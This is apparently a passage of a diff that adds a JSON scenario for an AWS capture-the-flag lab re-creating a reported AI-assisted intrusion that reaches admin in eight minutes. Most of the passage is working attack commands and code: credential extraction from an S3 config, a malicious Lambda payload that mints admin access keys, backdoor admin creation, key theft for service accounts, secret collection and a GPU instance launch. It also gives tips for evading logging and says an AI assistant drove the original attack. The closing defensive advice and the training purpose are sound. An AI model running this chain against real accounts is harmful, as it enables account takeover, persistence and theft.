sts assume-role \\\n  --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role \\\n  --role-session-name escalation > /dev/null 2>&1\n\nfor ROLE in developer external; do\n  aws sts assume-role \\\n    --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-${ROLE}-role \\\n    --role-session-name test > /dev/null 2>&1 \\\n    && echo \"Assumed ${ROLE}-role (session: test)\"\ndone\n```\n\nThat is 12 role assumption sessions across 5 roles. Each session appears as a separate principal in CloudTrail (e.g., `arn:aws:sts::{account_id}:assumed-role/pl-prod-8min-sysadmin-role/explore`), forcing incident responders to correlate activity across many identities.\n\n**Identity spreading \u2014 access key creation for pre-existing users:**\n\nThe attacker also takes over pre-existing service accounts by creating access keys for them. This is harder to detect than creating new users because the accounts already have established activity patterns:\n\n```bash\naws iam create-access-key --user-name pl-prod-8min-rocker\naws iam create-access-key --user-name pl-prod-8min-azureadmanager\naws iam create-access-key --user-name pl-prod-8min-deploy-svc\naws iam create-access-key --user-name pl-prod-8min-monitoring\naws iam create-access-key --user-name pl-prod-8min-ci-runner\n```\n\nNow the attacker has credentials for 5 pre-existing users plus the backdoor-admin they are about to create. Combined with the 12 role sessions, that is 19 unique AWS principals under attacker control. Only one needs to survive incident response for the attacker to maintain access.\n\nCheck whether Bedrock logging is active (the original attacker did this before invoking models):\n\n```bash\naws bedrock get-model-invocation-logging-configuration\n```\n\nIf logging is not configured, `InvokeModel` calls leave no record in CloudTrail. Invoke three models:\n\n```bash\n# Claude Haiku\naws bedrock-runtime invoke-model \\\n  --model-id anthropic.claude-haiku-20240307-v1:0 \\\n  --body '{\"anthropic_version\":\"bedrock-2023-05-31\",\"max_tokens\":100,\"messages\":[{\"role\":\"user\",\"content\":\"What is AWS IAM?\"}]}' \\\n  --cli-binary-format raw-in-base64-out \\\n  /tmp/bedrock_haiku.json\n\n# Amazon Nova Lite\naws bedrock-runtime invoke-model \\\n  --model-id amazon.nova-lite-v1:0 \\\n  --body '{\"messages\":[{\"role\":\"user\",\"content\":[{\"text\":\"What is AWS IAM?\"}]}]}' \\\n  --cli-binary-format raw-in-base64-out \\\n  /tmp/bedrock_nova.json\n\n# DeepSeek R1\naws bedrock-runtime invoke-model \\\n  --model-id us.deepseek.r1-v1:0 \\\n  --body '{\"messages\":[{\"role\":\"user\",\"content\":\"What is AWS IAM?\"}]}' \\\n  --cli-binary-format raw-in-base64-out \\\n  /tmp/bedrock_deepseek.json\n```\n\n**Cross-account movement (all fail):**\n\nThe original attacker's AI assistant generated several cross-account role ARNs based on patterns found during reconnaissance. Every attempt returned `AccessDenied` \u2014 either because the accounts did not exist or the roles did not trust the attacker.\n\n```bash\naws sts assume-role \\\n  --role-arn arn:aws:iam::123456789012:role/OrganizationAccountAccessRole \\\n  --role-session-name cross-account-attempt 2>&1\n# AccessDenied\n\naws sts assume-role \\\n  --role-arn arn:aws:iam::098765432109:role/admin \\\n  --role-session-name cross-account-attempt 2>&1\n# AccessDenied\n```\n\n**Data collection:**\n\n```bash\naws secretsmanager get-secret-value \\\n  --secret-id pl-prod-8min-db-credentials \\\n  --query 'SecretString'\n\naws ssm get-parameter \\\n  --name /pl/8min/api-key \\\n  --with-decryption \\\n  --query 'Parameter.Value'\n\naws lambda get-function \\\n  --function-name pl-prod-8min-ec2-init \\\n  --query 'Code.Location'\n```\n\n**GPU instance launch:**\n\n```bash\naws ec2 create-key-pair \\\n  --key-name pl-8min-attack-key \\\n  --query 'KeyMaterial' \\\n  --output text > /tmp/pl-8min-attack-key.pem\n\nchmod 400 /tmp/pl-8min-attack-key.pem\n\nSG_ID=$(aws ec2 create-security-group \\\n  --group-name pl-8min-attack-sg \\\n  --description 'Attack GPU instance SG' \\\n  --query 'GroupId' \\\n  --output text)\n\naws ec2 authorize-security-group-ingress \\\n  --group-id \"$SG_ID\" \\\n  --protocol tcp \\\n  --port 22 \\\n  --cidr 0.0.0.0/0\n\n# User data: #!/bin/bash\\nshutdown -h +120 (base64 encoded)\naws ec2 run-instances \\\n  --image-id ami-0c02fb55956c7d316 \\\n  --instance-type p3.2xlarge \\\n  --key-name pl-8min-attack-key \\\n  --security-group-ids \"$SG_ID\" \\\n  --user-data 'IyEvYmluL2Jhc2gKc2h1dGRvd24gLWggKzEyMA==' \\\n  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pl-8min-gpu}]'\n```\n\n> **Stop here and run cleanup.** The p3.2xlarge costs $3.06/hr and the 2-hour auto-shutdown is a last resort, not a plan.\n\n```bash\nplabs cleanup sysdig-8-minutes-to-admin\n```\n\n## Capture the Flag\n\nWith `pl-prod-8min-frick`'s admin credentials active, read the CTF flag from SSM Parameter Store:\n\n```bash\naws ssm get-parameter \\\n  --name /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin \\\n  --query Parameter.Value \\\n  --output text\n```\n\nA successful read confirms full administrative access has been achieved and completes the scenario objective.\n\n## What Happened\n\nYou started with a single IAM user that could read one S3 bucket. Inside that bucket was a plaintext credential embedded in a pipeline config file \u2014 a developer shortcut that bypassed the credential management tooling entirely. Those embedded credentials belonged to a service account that had write access to a Lambda function. That Lambda function had an execution role that could create IAM credentials for an admin user.\n\nThree misconfigurations stacked on top of each other: credentials in files, over-permissioned Lambda execution role, and write access to a production Lambda for an application service account. None of these findings is catastrophic in isolation. Together, they form a reliable path from a single leaked key to full account compromise.\n\nOnce inside, the attacker spread across the account's identity landscape \u2014 assuming 5 IAM roles across 12 sessions with varied session names, and creating access keys for 5 pre-existing service accounts, plus a newly created backdoor admin user. The original Sysdig blog documented 19 unique AWS principals under attacker control. This identity spreading technique serves two purposes: it makes detection harder because CloudTrail activity is distributed across many principals, and it ensures persistence because the defender must revoke every single compromised identity to fully evict the attacker. Missing even one means the attacker retains access.\n\nWhat the original attack added to this familiar chain was AI assistance. An AI assistant processed each API response, identified the Lambda injection opportunity, recognized that `admingh` was a dead end after the first failed escalation, and pivoted to `frick` without human deliberation. That decision cycle \u2014 which historically took an experienced attacker minutes of manual analysis \u2014 collapsed to seconds. Eight minutes from initial access to admin. The techniques were old; the speed was new.\n\nThe defense is not complicated: scan S3 objects for secrets (Macie), remove `iam:CreateAccessKey` from Lambda execution roles that have no credential rotation purpose (IAM Access Analyzer), restrict `lambda:UpdateFunctionCode` to deployment pipelines only, enforce access key rotation and maximum key age on service accounts, and monitor for bursts of `sts:AssumeRole` and `iam:CreateAccessKey` calls from a single principal. Any one of the first three controls would have broken the escalation chain. The last two would have limited the blast radius of the identity spreading.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-user",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-8min-starting-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal.\nThis IAM user \u2014 pl-prod-8min-starting-user \u2014 has a narrow set of permissions: it can list the contents of one specific S3 bucket and download objects from it. That bucket is a private RAG (Retrieval Augmented Generation) data store used by an internal ML pipeline. The permissions look innocuous, but the data inside the bucket is anything but.\n"
+      },
+      {
+        "id": "rag-bucket",
+        "label": "RAG Data Bucket",
+        "type": "resource",
+        "subType": "s3-bucket",
+        "arn": "arn:aws:s3:::pl-prod-8min-rag-data-{account_id}-{suffix}",
+        "description": "This private S3 bucket stores RAG pipeline data \u2014 chunked documents, embeddings, and pipeline configuration files used by the ML workload. The bucket is not publicly accessible, but one of its configuration files contains IAM credentials that were embedded by a developer who needed the pipeline to authenticate to another service.\nThe file config/rag-pipeline-config.json contains a JSON blob with a plaintext AWS access key ID and secret access key for pl-prod-8min-compromised-user. This is the credential style that Amazon Macie and secrets scanners are built to detect.\n"
+      },
+      {
+        "id": "compromised-user",
+        "label": "Compromised User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-8min-compromised-user",
+        "description": "pl-prod-8min-compromised-user is a service account with permissions typical of a pipeline operator: it can list and invoke Lambda functions, enumerate IAM users and roles, list Bedrock models, discover SSM parameters and Secrets Manager secrets, and assume several low-privilege roles. On its own, none of these permissions are alarming.\nThe danger is that this account can also update and invoke the pl-prod-8min-ec2-init Lambda function \u2014 a function whose execution role holds iam:CreateAccessKey on pl-prod-8min-frick, the account's admin user. Lambda write access combined with a privileged execution role is a one-hop privilege escalation path.\n"
+      },
+      {
+        "id": "ec2-init-lambda",
+        "label": "EC2 Init Lambda",
+        "type": "resource",
+        "subType": "lambda-function",
+        "arn": "arn:aws:lambda:{region}:{account_id}:function/pl-prod-8min-ec2-init",
+        "description": "pl-prod-8min-ec2-init is a Lambda function originally written to initialize EC2 instances as part of an internal provisioning workflow. Its execution role \u2014 pl-prod-8min-ec2-init-role \u2014 accumulated permissions over time as the team added EC2 initialization tasks. At some point someone added iam:CreateAccessKey on pl-prod-8min-frick to support a rotation workflow that was later abandoned. The permission was never removed.\nThe function's code is entirely replaceable by any principal with lambda:UpdateFunctionCode. Once the code is replaced, any call to lambda:InvokeFunction executes the new code under the execution role's identity \u2014 giving the caller access to all permissions that role holds.\nFirst injection attempt: the demo targets pl-prod-8min-admingh (a decoy user the execution role can also create keys for). The invocation succeeds but the keys produced have no useful permissions. Second injection: the demo targets pl-prod-8min-frick. Success.\n"
+      },
+      {
+        "id": "ec2-init-role",
+        "label": "EC2 Init Execution Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-8min-ec2-init-role",
+        "description": "pl-prod-8min-ec2-init-role is the IAM execution role attached to the pl-prod-8min-ec2-init Lambda function. When the Lambda is invoked, it assumes this role's identity and inherits all of its permissions. Over time, the role accumulated permissions beyond its original EC2 initialization purpose \u2014 including iam:CreateAccessKey on both pl-prod-8min-admingh (a decoy user) and pl-prod-8min-frick (the account's admin user). This over-permissioned execution role is the linchpin of the privilege escalation: without it, injecting code into the Lambda function would be useless.\n"
+      },
+      {
+        "id": "frick-admin-user",
+        "label": "Admin User (frick)",
+        "type": "principal",
+        "subType": "iam-user",
+        "isAdmin": true,
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-8min-frick",
+        "description": "pl-prod-8min-frick is the account's administrative IAM user with AdministratorAccess attached. By creating access keys for this user via the Lambda injection, the attacker gains full administrative control of the AWS account.\nWith frick's credentials the attacker can create backdoor accounts, access all secrets and parameters, invoke Bedrock models, and \u2014 as happened in the original attack \u2014 launch GPU instances for ML model training at the account owner's expense.\n"
+      },
+      {
+        "id": "ctf-flag",
+        "label": "CTF Flag",
+        "type": "resource",
+        "subType": "ssm-parameter",
+        "isTarget": true,
+        "arn": "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin",
+        "description": "The CTF flag is stored in SSM Parameter Store at /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin. It is readable only by principals with ssm:GetParameter on that path \u2014 which requires administrative access. Retrieving this parameter confirms you have successfully escalated to admin via pl-prod-8min-frick and completes the scenario objective.\n"
+      },
+      {
+        "id": "persistence-identities",
+        "label": "Persistence Identities",
+        "type": "collection",
+        "isTarget": true,
+        "description": "After gaining admin access, the attacker spreads across multiple principals to complicate detection and ensure persistence. The blog documents 19 unique AWS principals: 5 IAM roles assumed across 12 sessions (sysadmin, account, netadmin with sessions explore/test/pwned; sysadmin with escalation; developer and external with test), plus access keys created for 5 pre-existing IAM users (rocker with BedrockFullAccess, azureadmanager for Azure AD integration, deploy-svc, monitoring, ci-runner), and one newly created backdoor-admin user with AdministratorAccess.\nThis distribution ensures the attacker only needs one surviving principal to maintain access. Even if frick's credentials are rotated, any of the other compromised users or assumed role sessions can be used to re-establish full control.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-user",
+        "to": "rag-bucket",
+        "label": "s3:ListBucket + s3:GetObject",
+        "description": "Use the starting user's S3 permissions to enumerate the RAG bucket and download the pipeline configuration file that contains embedded IAM credentials.\n",
+        "commands": [
+          {
+            "description": "List the bucket contents to find the credentials file",
+            "command": "aws s3 ls s3://pl-prod-8min-rag-data-{account_id}-{suffix} --recursive"
+          },
+          {
+            "description": "Download the RAG pipeline config file",
+            "command": "aws s3 cp s3://pl-prod-8min-rag-data-{account_id}-{suffix}/config/rag-pipeline-config.json /tmp/rag-pipeline-config.json"
+          },
+          {
+            "description": "Extract the embedded credentials",
+            "command": "cat /tmp/rag-pipeline-config.json | jq '{access_key: .pipeline_auth.aws_access_key_id, secret_key: .pipeline_auth.aws_secret_access_key}'"
+          }
+        ],
+        "hints": [
+          "Use s3:ListBucket to enumerate the bucket recursively, then s3:GetObject to download any configuration files you find \u2014 look for JSON fields like aws_access_key_id or aws_secret_access_key.",
+          "Access key IDs start with AKIA (long-term) or ASIA (temporary). Once you find credentials, export them and verify with sts:GetCallerIdentity."
+        ]
+      },
+      {
+        "from": "rag-bucket",
+        "to": "compromised-user",
+        "label": "Credential extraction",
+        "description": "Parse the downloaded config file to extract the plaintext IAM access key ID and secret for pl-prod-8min-compromised-user, then configure those credentials for use.\n",
+        "commands": [
+          {
+            "description": "Set the compromised user credentials",
+            "command": "export AWS_ACCESS_KEY_ID=$(cat /tmp/rag-pipeline-config.json | jq -r '.pipeline_auth.aws_access_key_id')\nexport AWS_SECRET_ACCESS_KEY=$(cat /tmp/rag-pipeline-config.json | jq -r '.pipeline_auth.aws_secret_access_key')\nunset AWS_SESSION_TOKEN"
+          },
+          {
+            "description": "Verify the new identity",
+            "command": "aws sts get-caller-identity"
+          },
+          {
+            "description": "Enumerate IAM users to find high-value targets",
+            "command": "aws iam list-users --query 'Users[*].[UserName,Arn]' --output table"
+          },
+          {
+            "description": "Identify admin users by checking attached policies",
+            "command": "aws iam list-attached-user-policies --user-name pl-prod-8min-frick"
+          },
+          {
+            "description": "Enumerate Lambda functions",
+            "command": "aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table"
+          },
+          {
+            "description": "Inspect the ec2-init Lambda execution role",
+            "command": "aws lambda get-function --function-name pl-prod-8min-ec2-init --query 'Configuration.[FunctionName,Role]'"
+          },
+          {
+            "description": "Check what permissions the execution role holds",
+            "command": "aws iam get-role --role-name pl-prod-8min-ec2-init-role"
+          },
+          {
+            "description": "Attempt role assumptions \u2014 admin/Administrator fail, others succeed",
+            "command": "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/admin --role-session-name test 2>&1 || echo 'FAILED as expected'\naws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role --role-session-name recon"
+          }
+        ],
+        "hints": [
+          "Export the credentials from the config file and verify with sts:GetCallerIdentity. This user has lambda:UpdateFunctionCode and lambda:InvokeFunction \u2014 use them to inject code into a Lambda whose execution role holds iam:CreateAccessKey."
+        ]
+      },
+      {
+        "from": "compromised-user",
+        "to": "ec2-init-lambda",
+        "label": "lambda:UpdateFunctionCode + lambda:UpdateFunctionConfiguration",
+        "description": "Replace the Lambda function's code with a malicious handler that calls iam:CreateAccessKey on a target user specified via environment variable, then set the initial target username. The compromised user has lambda:UpdateFunctionCode, lambda:UpdateFunctionConfiguration, and lambda:InvokeFunction \u2014 full control over the function's behavior.\n",
+        "commands": [
+          {
+            "description": "Write the malicious Lambda handler",
+            "command": "cat > /tmp/lambda_payload.py << 'EOF'\nimport boto3\nimport os\n\ndef handler(event, context):\n    target = os.environ.get('TARGET_USER', '')\n    iam = boto3.client('iam')\n    response = iam.create_access_key(UserName=target)\n    key = response['AccessKey']\n    return {\n        'AccessKeyId': key['AccessKeyId'],\n        'SecretAccessKey': key['SecretAccessKey'],\n        'UserName': key['UserName']\n    }\nEOF"
+          },
+          {
+            "description": "Package the handler",
+            "command": "cd /tmp && zip lambda_payload.zip lambda_payload.py"
+          },
+          {
+            "description": "Upload the malicious handler to the Lambda function",
+            "command": "aws lambda update-function-code \\\n  --function-name pl-prod-8min-ec2-init \\\n  --zip-file fileb:///tmp/lambda_payload.zip"
+          },
+          {
+            "description": "Set the target environment variable to admingh",
+            "command": "aws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-admingh}'"
+          }
+        ],
+        "hints": [
+          "Fetch the existing function configuration to confirm the handler name, then write a Python handler that calls boto3's iam.create_access_key() with a target username read from an environment variable. Zip and upload with lambda:UpdateFunctionCode, then set the target via lambda:UpdateFunctionConfiguration so you can retarget without re-uploading.",
+          "Invoke the function and parse the JSON response for AccessKeyId and SecretAccessKey. Lambda returns HTTP 200 even when the handler throws \u2014 always check the response body. If the first target's keys have no useful permissions, update the environment variable to the admin user and invoke again.",
+          "Lambda code updates are not instantaneous \u2014 wait a few seconds after lambda:UpdateFunctionCode before invoking to ensure the new handler is active."
+        ]
+      },
+      {
+        "from": "ec2-init-lambda",
+        "to": "ec2-init-role",
+        "label": "Assumes execution role on invocation",
+        "description": "When the Lambda function is invoked, AWS automatically assumes the attached execution role (pl-prod-8min-ec2-init-role). The injected code now runs with the role's full permission set \u2014 including iam:CreateAccessKey on pl-prod-8min-admingh and pl-prod-8min-frick. This is the pivot point: the attacker's code, executing under a privileged role, can perform actions the compromised user never could directly.\nThe first invocation targets pl-prod-8min-admingh. Key creation succeeds but the returned credentials have no useful permissions \u2014 admingh is a decoy. The second invocation targets pl-prod-8min-frick, the account's admin user.\n",
+        "commands": [
+          {
+            "description": "Invoke with admingh \u2014 keys created but admingh has no useful permissions",
+            "command": "aws lambda invoke \\\n  --function-name pl-prod-8min-ec2-init \\\n  --payload '{}' \\\n  /tmp/lambda_response_admingh.json\ncat /tmp/lambda_response_admingh.json"
+          },
+          {
+            "description": "Retarget to frick (admin user)",
+            "command": "aws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-frick}'"
+          },
+          {
+            "description": "Invoke with frick \u2014 admin access keys returned",
+            "command": "aws lambda invoke \\\n  --function-name pl-prod-8min-ec2-init \\\n  --payload '{}' \\\n  /tmp/lambda_response_frick.json\ncat /tmp/lambda_response_frick.json"
+          }
+        ],
+        "hints": []
+      },
+      {
+        "from": "ec2-init-role",
+        "to": "frick-admin-user",
+        "label": "iam:CreateAccessKey",
+        "description": "The injected Lambda code, executing as pl-prod-8min-ec2-init-role, calls iam:CreateAccessKey for pl-prod-8min-frick. The returned credentials grant full AdministratorAccess. The attacker then creates a backdoor IAM user, creates access keys for rocker (Bedrock persistence), invokes Bedrock models, attempts cross-account movement (all fail), collects secrets and parameters, and launches a GPU instance.\n",
+        "commands": [
+          {
+            "description": "Configure frick's admin credentials",
+            "command": "export AWS_ACCESS_KEY_ID=$(cat /tmp/lambda_response_frick.json | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(cat /tmp/lambda_response_frick.json | jq -r '.SecretAccessKey')\nunset AWS_SESSION_TOKEN"
+          },
+          {
+            "description": "Verify admin access",
+            "command": "aws sts get-caller-identity\naws iam list-users --output table"
+          },
+          {
+            "description": "Create persistent backdoor IAM user",
+            "command": "aws iam create-user --user-name backdoor-admin\naws iam attach-user-policy \\\n  --user-name backdoor-admin \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name backdoor-admin"
+          },
+          {
+            "description": "Create access keys for rocker (Bedrock persistence)",
+            "command": "aws iam create-access-key --user-name pl-prod-8min-rocker"
+          },
+          {
+            "description": "Invoke Bedrock models (check logging first)",
+            "command": "aws bedrock get-model-invocation-logging-configuration\naws bedrock list-foundation-models --query 'modelSummaries[?contains(modelId, `claude`) || contains(modelId, `nova`) || contains(modelId, `deepseek`)].[modelId]' --output table"
+          },
+          {
+            "description": "Invoke Claude Haiku",
+            "command": "aws bedrock-runtime invoke-model \\\n  --model-id anthropic.claude-haiku-20240307-v1:0 \\\n  --body '{\"anthropic_version\":\"bedrock-2023-05-31\",\"max_tokens\":100,\"messages\":[{\"role\":\"user\",\"content\":\"What is AWS IAM?\"}]}' \\\n  --cli-binary-format raw-in-base64-out \\\n  /tmp/bedrock_response.json"
+          },
+          {
+            "description": "Attempt cross-account role assumption (will fail \u2014 hallucinated account IDs)",
+            "command": "aws sts assume-role \\\n  --role-arn arn:aws:iam::123456789012:role/OrganizationAccountAccessRole \\\n  --role-session-name cross-account-attempt 2>&1 || echo 'AccessDenied \u2014 cross-account target does not exist'"
+          },
+          {
+            "description": "Collect secrets and parameters",
+            "command": "aws secretsmanager get-secret-value --secret-id pl-prod-8min-db-credentials --query 'SecretString'\naws ssm get-parameter --name /pl/8min/api-key --with-decryption --query 'Parameter.Value'"
+          },
+          {
+            "description": "Launch GPU instance (p3.2xlarge) with 2-hour auto-shutdown",
+            "command": "aws ec2 create-key-pair --key-name pl-8min-attack-key --query 'KeyMaterial' --output text > /tmp/pl-8min-attack-key.pem\nSG_ID=$(aws ec2 create-security-group \\\n  --group-name pl-8min-attack-sg \\\n  --description 'Attack GPU instance SG' \\\n  --query 'GroupId' --output text)\naws ec2 authorize-security-group-ingress \\\n  --group-id $SG_ID \\\n  --protocol tcp --port 22 --cidr 0.0.0.0/0\naws ec2 run-instances \\\n  --image-id ami-0c02fb55956c7d316 \\\n  --instance-type p3.2xlarge \\\n  --key-name pl-8min-attack-key \\\n  --security-group-ids $SG_ID \\\n  --user-data 'IyEvYmluL2Jhc2gKc2h1dGRvd24gLWggKzEyMA==' \\\n  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pl-8min-gpu}]'"
+          }
+        ],
+        "hints": [
+          "Export frick's credentials and create a backdoor IAM user with AdministratorAccess immediately \u2014 this mirrors the original attacker's first persistence move.",
+          "Check whether Bedrock model invocation logging is enabled before invoking models; the original attacker inspected this to assess detection risk before calling bedrock-runtime.",
+          "Always terminate GPU instances (p3.2xlarge) immediately after demo \u2014 they are expensive and the demo includes launching one to replicate the original attack."
+        ]
+      },
+      {
+        "from": "frick-admin-user",
+        "to": "persistence-identities",
+        "label": "sts:AssumeRole + iam:CreateAccessKey + iam:CreateUser",
+        "description": "With AdministratorAccess, the attacker spreads across the account's identity landscape. They assume 5 IAM roles across 12 sessions using varied session names (explore, test, pwned, escalation) to distribute CloudTrail activity across principals. They create access keys for 5 pre-existing users (rocker, azureadmanager, deploy-svc, monitoring, ci-runner) and create a new backdoor-admin user with AdministratorAccess attached. This yields 19 unique principal identities \u2014 any one of which can be used to regain full access if the others are revoked.\n",
+        "commands": [
+          {
+            "description": "Assume roles with varied session names (representative sample)",
+            "command": "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role --role-session-name explore\naws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-netadmin-role --role-session-name pwned\naws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-external-role --role-session-name test"
+          },
+          {
+            "description": "Create access keys for pre-existing users",
+            "command": "aws iam create-access-key --user-name pl-prod-8min-rocker\naws iam create-access-key --user-name pl-prod-8min-azureadmanager\naws iam create-access-key --user-name pl-prod-8min-deploy-svc\naws iam create-access-key --user-name pl-prod-8min-monitoring\naws iam create-access-key --user-name pl-prod-8min-ci-runner"
+          },
+          {
+            "description": "Create backdoor admin user with persistent access",
+            "command": "aws iam create-user --user-name backdoor-admin\naws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name backdoor-admin"
+          }
+        ],
+        "hints": [
+          "Assume roles with different session names (explore, test, pwned, escalation) to distribute CloudTrail entries across principal identifiers, making correlation harder during incident response.",
+          "Create access keys for pre-existing service accounts rather than only newly created users \u2014 established accounts have normal usage patterns that are less likely to trigger anomaly alerts."
+        ]
+      },
+      {
+        "from": "frick-admin-user",
+        "to": "ctf-flag",
+        "label": "ssm:GetParameter",
+        "description": "Read the CTF flag from SSM Parameter Store using the admin credentials obtained via Lambda injection. This confirms full administrative access has been achieved and completes the scenario objective.\n",
+        "commands": [
+          {
+            "description": "Read the CTF flag from SSM Parameter Store",
+            "command": "aws ssm get-parameter --name /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin --query Parameter.Value --output text"
+          }
+        ],
+        "hints": [
+          "You have admin credentials for pl-prod-8min-frick. Use ssm:GetParameter to read the flag stored at /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin."
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 3,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "s3",
+    "lambda",
+    "iam"
+  ],
+  "slug": "sysdig-8-minutes-to-admin",
+  "hasDemoTranscript": true
+}
